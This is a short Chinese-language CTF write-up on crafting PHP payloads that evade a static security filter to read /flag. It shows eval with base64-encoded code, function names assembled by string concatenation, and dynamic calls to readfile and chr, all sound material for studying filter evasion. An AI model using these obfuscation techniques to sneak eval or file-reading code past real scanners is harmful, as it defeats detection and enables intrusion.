# 内网渗透与高级社工-免杀payload制作-G4 WriteUp

## 分析

尝试一下`readfile(/flag)`payload：

```php
readfile(chr(47).'fl'.'ag');
```

返回`✕ 脚本未通过安全校验`，单独输入`readfile`同样不行，说明readfile函数被过滤，同时`chr`函数也被过滤，可考虑使用加密类免杀

单独输入`eval`未被过滤，可以尝试使用`eval`函数来解密执行payload。

## 解题

尝试使用base64编码来绕过过滤，构造payload如下：

```php
eval(base64_decode('cmVhZGZpbGUoY2hyKDQ3KS4nZmwnLidhZycpOw=='));
```

结果未通过安全校验，说明base64_decode函数被静态检测过滤，使用字符串拼接的方式绕过过滤，构造payload如下：

```php
$func = "base64_" . "decode";
eval($func('cmVhZGZpbGUoY2hyKDQ3KS4nZmwnLidhZycpOw=='));
```

成功获取flag。

## 补充

既然这样就能绕过，为什么不考虑直接拼接readfile和chr呢？试了一下还真行。

```php
$func = "readf" . "ile";
$func2= "ch"."r";
$func($func2(47).'fl'.'ag');
```